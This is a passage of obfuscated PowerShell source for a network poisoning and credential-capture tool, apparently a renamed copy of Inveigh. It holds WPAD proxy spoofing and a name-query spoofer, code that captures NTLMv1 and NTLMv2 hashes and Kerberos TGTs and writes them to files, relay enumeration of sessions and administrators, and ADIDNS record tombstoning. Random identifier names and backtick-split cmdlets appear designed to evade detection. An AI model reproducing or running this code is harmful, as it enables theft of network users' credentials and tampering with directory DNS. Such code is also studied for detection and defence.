    if($YawnOdd -or $YummyShame -and $SwingHorses -ne 'html/text')
    {
        $LightOval.output_queue.Add("[+] HTTP/HTTPS/Proxy Content Type = $SwingHorses")  > $null
    }

    if($SkirtStone -eq 'Basic' -or $LoadTrade -eq 'Basic')
    {
        $LightOval.output_queue.Add("[+] Basic Authentication Realm = $SuperbBlood")  > $null
    }

    if($RecordRobust)
    {

        foreach($NightHook in $RecordRobust)
        {
            $NestCoast += 'if (dnsDomainIs(host, "' + $NightHook + '")) return "DIRECT";'
        }

    }

    if($JumpyWrench -eq 'Y')
    {

        if($LethalFrog)
        {
            $JumpyWrench = "N"
            $LightOval.output_queue.Add("[-] Proxy Capture Disabled Due To In Use Port $OafishAllow")  > $null
        }
        else
        {
            $LightOval.output_queue.Add("[+] Proxy Capture = Enabled")  > $null
            $LightOval.output_queue.Add("[+] Proxy Port = $OafishAllow") > $null
            $LightOval.output_queue.Add("[+] Proxy Authentication = $LightDesign")  > $null
            $BadgeMate = $OafishAllow + 1
            $ExpandNest = ($ExpandNest | Where-Object {$_ -and $_.Trim()})

            if($ExpandNest.Count -gt 0)
            {
                $LightOval.output_queue.Add("[+] Proxy Ignore List = " + ($ExpandNest -join ","))  > $null
            }

            if($PreachBad -eq '0.0.0.0')
            {
                $RoomLike = $SmashDolls
            }
            else
            {
                $RoomLike = $PreachBad
            }

            if($PlayIdea -and $RuralOpen)
            {
                $ReasonTrust = "function FindProxyForURL(url,host){$NestCoast return `"PROXY $RoomLike`:$OafishAllow; PROXY $PlayIdea`:$RuralOpen; DIRECT`";}"
            }
            else
            {
                $ReasonTrust = "function FindProxyForURL(url,host){$NestCoast return `"PROXY $RoomLike`:$OafishAllow; PROXY $RoomLike`:$BadgeMate; DIRECT`";}"
            }

        }

    }

    $LightOval.output_queue.Add("[+] WPAD Authentication = $LoadTrade")  > $null

    if($LoadTrade -like "NTLM*")
    {
        $RobustFail = ($RobustFail | Where-Object {$_ -and $_.Trim()})

        if($RobustFail.Count -gt 0)
        {
            $LightOval.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($RobustFail -join ","))  > $null
        }

    }

    if($RecordRobust)
    {
        $LightOval.output_queue.Add("[+] WPAD Direct Hosts = " + ($RecordRobust -join ","))  > $null
    }

    if($ReasonTrust -and $JumpyWrench -eq 'N')
    {
        $LightOval.output_queue.Add("[+] WPAD Response = Enabled")  > $null
    }
    elseif($ReasonTrust -and $JumpyWrench -eq 'Y')
    {
        $LightOval.output_queue.Add("[+] WPAD Proxy Response = Enabled")  > $null

        if($PlayIdea -and $RuralOpen)
        {
            $LightOval.output_queue.Add("[+] WPAD Failover = $PlayIdea`:$RuralOpen")  > $null
        }

    }
    elseif($PlayIdea -and $RuralOpen)
    {
        $LightOval.output_queue.Add("[+] WPAD Response = Enabled")  > $null
        $LightOval.output_queue.Add("[+] WPAD = $PlayIdea`:$RuralOpen")  > $null
        
        if($RecordRobust)
        {

            foreach($NightHook in $RecordRobust)
            {
                $NestCoast += 'if (dnsDomainIs(host, "' + $NightHook + '")) return "DIRECT";'
            }

            $ReasonTrust = "function FindProxyForURL(url,host){" + $NestCoast + "return `"PROXY " + $PlayIdea + ":" + $RuralOpen + "`";}"
            $LightOval.output_queue.Add("[+] WPAD Direct Hosts = " + ($RecordRobust -join ","))  > $null
        }
        else
        {
            $ReasonTrust = "function FindProxyForURL(url,host){$NestCoast return `"PROXY $PlayIdea`:$RuralOpen; DIRECT`";}"
        }

    }

    if($HeavySmall)
    {
        $LightOval.output_queue.Add("[+] HTTP NTLM Challenge = $HeavySmall")  > $null
    }

}

if($HeapDetect -eq 'Y')
{
    $LightOval.output_queue.Add("[+] Kerberos TGT Capture = Enabled")  > $null
    $LightOval.output_queue.Add("[+] Kerberos TGT File Output Count = $KindLick")  > $null
    
    if($OrangeDog.Count -gt 0)
    {
        $LightOval.output_queue.Add("[+] Kerberos TGT Host Header List = " + ($OrangeDog -join ","))  > $null
    }

}
else
{
    $LightOval.output_queue.Add("[+] Kerberos TGT Capture = Disabled")  > $null    
}

if($ShinyUppity -eq 'N')
{
    $LightOval.output_queue.Add("[+] Machine Account Capture = Disabled")  > $null
    $LightOval.machine_accounts = $false
}
else
{
    $LightOval.output_queue.Add("[+] Machine Account Capture = Enabled")  > $null
    $LightOval.machine_accounts = $true
}

if($RottenBed -ne 'N')
{

    if($RottenBed -ne 'N')
    {

        if($RottenBed -eq 'Y')
        {
            $LightOval.output_queue.Add("[+] Console Output = Full")  > $null
        }
        else
        {
            $LightOval.output_queue.Add("[+] Console Output = $RottenBed")  > $null
        }

    }

    $LightOval.console_output = $true

    if($CycleLovely -eq 1)
    {
        $LightOval.output_queue.Add("[+] Console Status = $CycleLovely Minute")  > $null
    }
    elseif($CycleLovely -gt 1)
    {
        $LightOval.output_queue.Add("[+] Console Status = $CycleLovely Minutes")  > $null
    }

}
else
{

    if($LightOval.tool -eq 1)
    {
        $LightOval.output_queue.Add("[+] Console Output Disabled Due To External Tool Selection")  > $null
    }
    else
    {
        $LightOval.output_queue.Add("[+] Console Output = Disabled")  > $null
    }

}

if($EscapeArch -eq 'Y')
{
    $LightOval.console_unique = $true
}
else
{
    $LightOval.console_unique = $false
}

if($FileOutput -eq 'Y' -or ($HeapDetect -eq 'Y' -and $KindLick -gt 0) -or ($SlimyCable -eq 'File' -and ($BreezyDesign -or $FairAblaze)))
{
    
    if($FileOutput -eq 'Y')
    {
        $LightOval.output_queue.Add("[+] File Output = Enabled")  > $null
        $LightOval.file_output = $true
    }

    if($SlimyCable -eq 'File')
    {
        $LightOval.output_queue.Add("[+] Pcap Output = File") > $null
        
        if($BreezyDesign)
        {
            $LightOval.output_queue.Add("[+] Pcap TCP Ports = " + ($BreezyDesign -join ","))  > $null
        }

        if($FairAblaze)
        {
            $LightOval.output_queue.Add("[+] Pcap UDP Ports = " + ($FairAblaze -join ","))  > $null
        }

    }

    $LightOval.output_queue.Add("[+] Output Directory = $SilkySmelly")  > $null 
}
else
{
    $LightOval.output_queue.Add("[+] File Output = Disabled")  > $null
}

if($SlimyCable -eq 'Memory')
{
    $LightOval.output_queue.Add("[+] Pcap Output = Memory")
}

if($FileUnique -eq 'Y')
{
    $LightOval.file_unique = $true
}
else
{
    $LightOval.file_unique = $false
}

if($WhiteNote -eq 'Y')
{
    $LightOval.log_output = $true
}
else
{
    $LightOval.log_output = $false
}

if($MatterOffice)
{
    $LightOval.output_queue.Add("[+] Run Count = $MatterOffice") > $null
}

if($GrowthWind -eq 1)
{
    $LightOval.output_queue.Add("[+] Run Time = $GrowthWind Minute")  > $null
}
elseif($GrowthWind -gt 1)
{
    $LightOval.output_queue.Add("[+] Run Time = $GrowthWind Minutes")  > $null
}

if($DollHead -eq 'Y')
{
    $LightOval.output_queue.Add("[!] Run Stop-LightOval to stop")  > $null

    if($LightOval.console_output)
    {
        $LightOval.output_queue.Add("[*] Press any key to stop console output")  > $null
    }

}

while($LightOval.output_queue.Count -gt 0)
{

    switch -Wildcard ($LightOval.output_queue[0])
    {

        {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
        {

            if($LightOval.status_output -and $LightOval.output_stream_only)
            {
                Write-TableSteam($LightOval.output_queue[0] + $LightOval.newline)
            }
            elseif($LightOval.status_output)
            {
                Write-Warning($LightOval.output_queue[0])
            }

            if($LightOval.file_output)
            {
                $LightOval.log_file_queue.Add($LightOval.output_queue[0]) > $null
            }

            if($LightOval.log_output)
            {
                $LightOval.log.Add($LightOval.output_queue[0]) > $null
            }

            $LightOval.output_queue.RemoveAt(0)
        }

        default
        {

            if($LightOval.status_output -and $LightOval.output_stream_only)
            {
                Write-TableSteam($LightOval.output_queue[0] + $LightOval.newline)
            }
            elseif($LightOval.status_output)
            {
                Write-TableSteam($LightOval.output_queue[0])
            }

            if($LightOval.file_output)
            {

                if ($LightOval.output_queue[0].StartsWith("[+] ") -or $LightOval.output_queue[0].StartsWith("[*] "))
                {
                    $LightOval.log_file_queue.Add($LightOval.output_queue[0]) > $null
                }
                else
                {
                    $LightOval.log_file_queue.Add("[redacted]") > $null    
                }

            }

            if($LightOval.log_output)
            {
                $LightOval.log.Add($LightOval.output_queue[0]) > $null
            }

            $LightOval.output_queue.RemoveAt(0)
        }

    }

}

$LightOval.status_output = $false

# Microsoft".
# Microsoft".

# Microsoft".
$LivelySqueak =
{

    function Get-UInt16DataLength
    {
        param ([Int]$InjureNoise,[Byte[]]$IckyBloody)
        $UnableActor = [System.BitConverter]::ToUInt16($IckyBloody[$InjureNoise..($InjureNoise + 1)],0)

        return $UnableActor
    }

    function Get-UInt32DataLength
    {
        param ([Int]$InjureNoise,[Byte[]]$IckyBloody)

        $UnableActor = [System.BitConverter]::ToUInt32($IckyBloody[$InjureNoise..($InjureNoise + 3)],0)

        return $UnableActor
    }

    function Convert-DataToString
    {
        param ([Int]$InjureNoise,[Int]$PlaceBook,[Byte[]]$IckyBloody)

        $DeathZephyr = [System.BitConverter]::ToString($IckyBloody[$InjureNoise..($InjureNoise + $PlaceBook - 1)])
        $DeathZephyr = $DeathZephyr -replace "-00",""
        $DeathZephyr = $DeathZephyr.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $BranchSick = ne`w-`obje`ct System.String ($DeathZephyr,0,$DeathZephyr.Length)

        return $BranchSick
    }

    function Convert-DataToUInt16($HeapShut)
    {
	   [Array]::Reverse($HeapShut)
	   return [System.BitConverter]::ToUInt16($HeapShut,0)
    }

    function Convert-DataToUInt32($HeapShut)
    {
	   [Array]::Reverse($HeapShut)
	   return [System.BitConverter]::ToUInt32($HeapShut,0)
    }

    function Get-SpooferResponseMessage
    {
        param ([String]$ExpectRitzy,[String]$EarBucket,[String]$IrateKneel,[String]$GustyDance,[byte]$PiesDesk)

        if($ExpectRitzy -like "*.*")
        {
            [Array]$VaseLick = $ExpectRitzy.Split('.')
            $NoseSecond = $VaseLick[0]
        }

        $WheelBlack = "[+]"

        if($MeekSmoggy)
        {
            $KindPale = "[inspect only]"
        }
        elseif($GustyDance -eq 'N')
        {
            $KindPale = "[spoofer disabled]"
        }
        elseif($BikeLoud -and ($BikeLoud -notcontains $ExpectRitzy -and $BikeLoud -notcontains $NoseSecond))
        {
            $KindPale = "[$ExpectRitzy not on reply list]"
        }
        elseif($HoleRoute -contains $ExpectRitzy -or $HoleRoute -contains $NoseSecond)
        {
            $KindPale = "[$ExpectRitzy is on ignore list]"
        }
        elseif($WoozyClose -and $WoozyClose -notcontains $StuffSky)
        {
            $KindPale = "[$StuffSky not on reply list]"
        }
        elseif($ObeyAttack -contains $StuffSky)
        {
            $KindPale = "[$StuffSky is on ignore list]"
        }
        elseif($LightOval.valid_host_list -contains $AcidDolls -and ($BikeLoud -notcontains $ExpectRitzy -and $BikeLoud -notcontains $NoseSecond))
        {
            $KindPale = "[$AcidDolls is a valid host]"
        }
        elseif($RelyNotice -eq 'Y' -and $LightOval.IP_capture_list -contains $StuffSky.IPAddressToString)
        {
            $KindPale = "[previous $StuffSky capture]"
        }
        elseif($EarBucket -eq 'NBNS' -and $StuffSky.IPAddressToString -eq $SmashDolls)
        {
            $KindPale = "[local query]"
        }
        elseif($PlugTour -eq 'Y' -or $SmokeFang -and $SmokeZebra.Elapsed -lt $PlantFoot)
        {
            $KindPale = ": " + [Int]($SmokeFang - $SmokeZebra.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
        }
        elseif($EarBucket -eq 'NBNS' -and $ThawMiddle -notcontains $HealthIcy)
        {
            $KindPale = "[NBNS type disabled]"
        }
        elseif($EarBucket -eq 'NBNS' -and $PiesDesk -eq 33)
        {
            $KindPale = "[NBSTAT request]"
        }
        elseif($BootShrill -eq 'Y' -and $EarBucket -ne 'mDNS' -and $EarBucket -ne 'DNS' -and $BattleSalt.IPAddressToString -eq $SmashDolls)
        {
            $KindPale = "[possible ResponderGuard request ignored]"
            $WheelBlack = "[!]"
        }
        elseif($EarBucket -eq 'mDNS' -and $IrateKneel -and $WantLittle -notcontains $IrateKneel)
        {
            $KindPale = "[mDNS type disabled]"
        }
        elseif($EarBucket -ne 'mDNS' -and $EarBucket -ne 'DNS' -and $OwnBump -gt 0 -and @($LightOval.request_table.$ExpectRitzy | Where-Object {$_ -match $StuffSky.IPAddressToString}).Count -le $OwnBump)
        {
            $KindPale = "[SpooferThresholdHost >= $(@($LightOval.request_table.$ExpectRitzy | Where-Object {$_ -match $StuffSky.IPAddressToString}).Count)]"
        }
        elseif($EarBucket -ne 'mDNS' -and $EarBucket -ne 'DNS' -and $SameSneaky -gt 0 -and @($LightOval.request_table.$ExpectRitzy | Sort-Object | Get-Unique).Count -le $SameSneaky)
        {
            $KindPale = "[SpooferThresholdNetwork >= $(@($LightOval.request_table.$ExpectRitzy | Sort-Object | Get-Unique).Count)]"
        }
        elseif($ExpectRitzy -match '[^\x00-\x7F]+')
        {
            $KindPale = "[nonprintable characters]"
        }
        else
        {
            $KindPale = "[response sent]"
        }

        return $WheelBlack,$KindPale
    }

    function Get-NeedleSoak([String]$NeedleSoak)
    {

        switch ($NeedleSoak)
        {

            '41-41'
            {
                $HealthIcy = "00"
            }

            '41-42'
            {
                $HealthIcy = "01"
            }

            '41-43'
            {
                $HealthIcy = "02"
            }

            '41-44'
            {
                $HealthIcy = "03"
            }

            '43-41'
            {
                $HealthIcy = "20"
            }

            '42-4C'
            {
                $HealthIcy = "1B"
            }

            '42-4D'
            {
                $HealthIcy = "1C"
            }

            '42-4E'
            {
                $HealthIcy = "1D"
            }

            '42-4F'
            {
                $HealthIcy = "1E"
            }

        }

        return $HealthIcy
    }

    function Get-NameQueryString([Int]$ElatedCent, [Byte[]]$NameQuery)
    {
        $BouncyPlucky = $NameQuery[12]

        if($BouncyPlucky -gt 0)
        {
            $ColorReply = 0
            $name_query_string = ''

            do
            {
                $name_query_string += [System.Text.Encoding]::UTF8.GetString($NameQuery[($ElatedCent + 1)..($ElatedCent + $BouncyPlucky)])
                $ElatedCent += $BouncyPlucky + 1
                $BouncyPlucky = $NameQuery[$ElatedCent]
                $ColorReply++

                if($BouncyPlucky -gt 0)
                {
                    $name_query_string += "."
                }

            }
            until($BouncyPlucky -eq 0 -or $ColorReply -eq 127)
            
        }

        return $name_query_string
    }

    function ConvertFrom-PacketOrderedDictionary
    {
        param($AjarMix)

        foreach($HeapShut in $AjarMix.Values)
        {
            $byte_array += $HeapShut
        }

        return $byte_array
    }

    function New-RelayEnumObject
    {
        param ($SmashDolls,$OrderSteam,$RainyShave,$ItchyDusty,$FryHarbor,$MurderYummy,$GaudyWait,$RusticCare,$UniteDuck,
        $StiffFull,$RelyTawdry,$MeddleBruise,$TeenySound,$PloughBouncy,$FoldDam,$HeadyCan)

        if($RainyShave -and $RainyShave -isnot [Array]){$RainyShave = @($RainyShave)}
        if($ItchyDusty -and $ItchyDusty -isnot [Array]){$ItchyDusty = @($ItchyDusty)}
        if($FryHarbor -and $FryHarbor -isnot [Array]){$FryHarbor = @($FryHarbor)}
        if($MurderYummy -and $MurderYummy -isnot [Array]){$MurderYummy = @($MurderYummy)}
        if($GaudyWait -and $GaudyWait -isnot [Array]){$GaudyWait = @($GaudyWait)}
        if($RusticCare -and $RusticCare -isnot [Array]){$RusticCare = @($RusticCare)}
        if($UniteDuck -and $UniteDuck -isnot [Array]){$UniteDuck = @($UniteDuck)}
        if($StiffFull -and $StiffFull -isnot [Array]){$StiffFull = @($StiffFull)}

        $AllowDebt = ne`w-`obje`ct PSObject
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Index" $LightOval.enumerate.Count
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "IP" $SmashDolls
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Hostname" $OrderSteam
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Sessions" $RainyShave
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Users" $ItchyDusty
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Groups" $FryHarbor
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Privileged" $MurderYummy
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Shares" $GaudyWait
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions" $RusticCare
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions Mapped" $UniteDuck
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Local Users" $StiffFull
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB2.1" $RelyTawdry
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Signing" $MeddleBruise
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB Server" $TeenySound
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Targeted" $PloughBouncy
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Enumerate" $RiverErect
        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Execute" $ZipKey

        return $AllowDebt
    }

    function Invoke-SessionUpdate
    {
        param ([String]$DesireUnique,[String]$StuffDark,[String]$OrderSteam,[String]$SmashDolls)

        if($LightOval.domain_mapping_table.$DesireUnique)
        {
            $RejectFast = ($StuffDark + "@" + $LightOval.domain_mapping_table.$DesireUnique).ToUpper()
            $LoveEggs = ($OrderSteam + "." + $LightOval.domain_mapping_table.$DesireUnique).ToUpper()
        }
        else
        {
            $RejectFast = $DesireUnique + "\" + $StuffDark
        }

        for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
        {

            if($LightOval.enumerate[$ColorReply].Hostname -eq $LoveEggs -or $LightOval.enumerate[$ColorReply].IP -eq $SmashDolls)
            {

                if(!$LightOval.enumerate[$ColorReply].Hostname)
                {
                    $LightOval.enumerate[$SuperRigid].Hostname = $LoveEggs
                }

                [Array]$SmallRoyal = $LightOval.enumerate[$ColorReply].Sessions

                if($LightOval.domain_mapping_table.$DesireUnique)
                {

                    for($WindyEarth = 0;$WindyEarth -lt $SmallRoyal.Count;$WindyEarth++)
                    {

                        if($SmallRoyal[$WindyEarth] -like "$DesireUnique\*")
                        {
                            $BoredObject = ($SmallRoyal[$WindyEarth].Split("\"))[1]
                            $DirtUnpack = $BoredObject + "@" + $LightOval.domain_mapping_table.$DesireUnique
                            $SmallRoyal[$WindyEarth] += $DirtUnpack
                            $LightOval.enumerate[$ColorReply].Sessions = $SmallRoyal
                        }

                    }

                }

                if($SmallRoyal -notcontains $RejectFast)
                {
                    $SmallRoyal += $RejectFast
                    $LightOval.enumerate[$ColorReply].Sessions = $SmallRoyal
                }

                $MixBed = $true
                break
            }

        }
     
        if(!$MixBed)
        {
            $LightOval.enumerate.Add((New-RelayEnumObject -SmashDolls $SmashDolls -OrderSteam $LoveEggs -RainyShave $RejectFast)) > $null
        }

    }

    

}

# Microsoft".
$UppitySheep =
{

    function Get-NTLMResponse
    {
        param ([Byte[]]$MuscleRatty,[String]$MilkyRush,[String]$RiddlePizzas,[String]$HollowThick,[String]$SlipPorter,[String]$ClassySquash)

        $BabyVoice = [System.BitConverter]::ToString($MuscleRatty)
        $BabyVoice = $BabyVoice -replace "-",""
        $SlowFork = $BabyVoice.IndexOf("4E544C4D53535000")
        $RejectFast = "$RiddlePizzas`:$HollowThick"

        if($SlowFork -ge 0 -and $BabyVoice.SubString(($SlowFork + 16),8) -eq "03000000")
        {
            $ThrillWise = $SlowFork / 2
            $CornVulgar = Get-UInt16DataLength ($ThrillWise + 12) $MuscleRatty
            $FootCaring = Get-UInt32DataLength ($ThrillWise + 16) $MuscleRatty
            $YamKettle = [System.BitConverter]::ToString($MuscleRatty[($ThrillWise + $FootCaring)..($ThrillWise + $FootCaring + $CornVulgar - 1)]) -replace "-",""
            $LastCrabby = Get-UInt16DataLength ($ThrillWise + 20) $MuscleRatty
            $CrateBite = Get-UInt32DataLength ($ThrillWise + 24) $MuscleRatty
            $ServeLamp = [System.BitConverter]::ToString($MuscleRatty[($ThrillWise + $CrateBite)..($ThrillWise + $CrateBite + $LastCrabby - 1)]) -replace "-",""
            $GateWorry = Get-UInt16DataLength ($ThrillWise + 28) $MuscleRatty
            $LooseHammer = Get-UInt32DataLength ($ThrillWise + 32) $MuscleRatty

            if($GateWorry -gt 0)
            {
                $BrushSuck = Convert-DataToString ($ThrillWise + $LooseHammer) $GateWorry $MuscleRatty
            }

            $StitchShiver = Get-UInt16DataLength ($ThrillWise + 36) $MuscleRatty
            $MournScrew = Get-UInt32DataLength ($ThrillWise + 40) $MuscleRatty
            $BestFluffy = Convert-DataToString ($ThrillWise + $MournScrew) $StitchShiver $MuscleRatty
            $GrayLove = Get-UInt16DataLength ($ThrillWise + 44) $MuscleRatty
            $FoodStingy = Get-UInt32DataLength ($ThrillWise + 48) $MuscleRatty
            $TryHole = Convert-DataToString ($ThrillWise + $FoodStingy) $GrayLove $MuscleRatty

            if($ClassySquash -eq "SMB")
            {
                $EggsExist = $LightOval.SMB_session_table.$RejectFast
            }
            else
            {
                $EggsExist = $LightOval.HTTP_session_table.$RejectFast
            }
            
            if($LastCrabby -gt 24)
            {

                if($EggsExist)
                {

                    $SmoggyParty = $ServeLamp.Insert(32,':')
                    $BasinSalt = $BestFluffy + "::" + $BrushSuck + ":" + $EggsExist + ":" + $SmoggyParty

                    if($MilkyRush -eq 'Y')
                    {

                        if($LightOval.machine_accounts -or (!$LightOval.machine_accounts -and -not $BestFluffy.EndsWith('$')))
                        {
                            $LightOval.NTLMv2_list.Add($BasinSalt) > $null

                            if(!$LightOval.console_unique -or ($LightOval.console_unique -and $LightOval.NTLMv2_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy"))
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:") > $null
                                $LightOval.output_queue.Add($BasinSalt) > $null
                            }
                            else
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[not unique]") > $null
                            }

                            if($LightOval.file_output -and (!$LightOval.file_unique -or ($LightOval.file_unique -and $LightOval.NTLMv2_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")))
                            {
                                $LightOval.NTLMv2_file_queue.Add($BasinSalt) > $null
                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 written to " + "Inveigh-WishMetal.txt") > $null
                            }

                            if($LightOval.NTLMv2_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")
                            {
                                $LightOval.NTLMv2_username_list.Add("$RiddlePizzas $BrushSuck\$BestFluffy") > $null
                            }

                            if($LightOval.IP_capture_list -notcontains $RiddlePizzas -and -not $BestFluffy.EndsWith('$') -and !$LightOval.spoofer_repeat -and $RiddlePizzas -ne $SmashDolls)
                            {
                                $LightOval.IP_capture_list.Add($RiddlePizzas) > $null
                            }

                        }
                        else
                        {
                            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[machine account]") > $null    
                        }

                    }
                    else
                    {
                        $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[capture disabled]") > $null    
                    }

                }
                else
                {
                    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv2 challenge missing for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick") > $null    
                }

            }
            elseif($LastCrabby -eq 24)
            {

                if($EggsExist)
                {

                    $CrowdHat = $BestFluffy + "::" + $BrushSuck + ":" + $YamKettle + ":" + $ServeLamp + ":" + $EggsExist

                    if($MilkyRush -eq 'Y')
                    {

                        if($LightOval.machine_accounts -or (!$LightOval.machine_accounts -and -not $BestFluffy.EndsWith('$')))
                        {
                            $LightOval.NTLMv1_list.Add($CrowdHat) > $null

                            if(!$LightOval.console_unique -or ($LightOval.console_unique -and $LightOval.NTLMv1_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy"))
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SlipPorter) NTLMv1 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:") > $null
                                $LightOval.output_queue.Add($CrowdHat) > $null
                            }
                            else
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SlipPorter) NTLMv1 captured for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[not unique]") > $null
                            }

                            if($LightOval.file_output -and (!$LightOval.file_unique -or ($LightOval.file_unique -and $LightOval.NTLMv1_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")))
                            {
                                $LightOval.NTLMv1_file_queue.Add($CrowdHat) > $null
                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] SMB($SlipPorter) NTLMv1 written to " + "Inveigh-MarketJuggle.txt") > $null
                            }

                            if($LightOval.NTLMv1_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")
                            {
                                $LightOval.NTLMv1_username_list.Add("$RiddlePizzas $BrushSuck\$BestFluffy") > $null
                            }

                            if($LightOval.IP_capture_list -notcontains $RiddlePizzas -and -not $BestFluffy.EndsWith('$') -and !$LightOval.spoofer_repeat -and $RiddlePizzas -ne $SmashDolls)
                            {
                                $LightOval.IP_capture_list.Add($RiddlePizzas) > $null
                            }

                        }
                        else
                        {
                            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv1 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[machine account]") > $null    
                        }

                    }
                    else
                    {
                        $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv1 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[capture disabled]") > $null    
                    }

                }
                else
                {
                    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv1 challenge missing for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick") > $null    
                }

            }
            elseif($LastCrabby -eq 0)
            {
                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLM null response from $RiddlePizzas($TryHole)`:$HollowThick") > $null
            }

            Invoke-SessionUpdate $BrushSuck $BestFluffy $TryHole $StuffSky
        }

    }

}

# Microsoft".
$StreetFound =
{

    function Disable-ADIDNSNode
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$DesireUnique,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$true)][String]$FilmJazzy,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $DonkeyFrail = New-DonkeyFrail -TrickWander $TrickWander -PersonCheer $PersonCheer

        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
        $BrickOwn = $DesireUnique.Split(".")

        foreach($NiceFree in $BrickOwn)
        {
            $GaudySoothe += ",DC=$NiceFree"
        }

        if($Credential)
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
        }

        $KnockHusky = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date "1/1/1601").Ticks)
        $KnockHusky = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($KnockHusky))
        $KnockHusky = $KnockHusky.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}

        [Byte[]]$PlacidHorn = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
            $DonkeyFrail[0..3] +
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
            $KnockHusky

        try
        {
            $TownPack.InvokeSet('dnsRecord',$PlacidHorn)
            $TownPack.InvokeSet('dnsTombstoned',$true)
            $TownPack.SetInfo()
            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $FilmJazzy tombstoned in $PersonCheer") > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        if($TownPack.Path)
        {
            $TownPack.Close()
        }

    }

    function Enable-ADIDNSNode
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$IckyBloody,    
            [parameter(Mandatory=$false)][String]$ChiefRate,
            [parameter(Mandatory=$false)][String]$DesireUnique,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$true)][String]$FilmJazzy,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
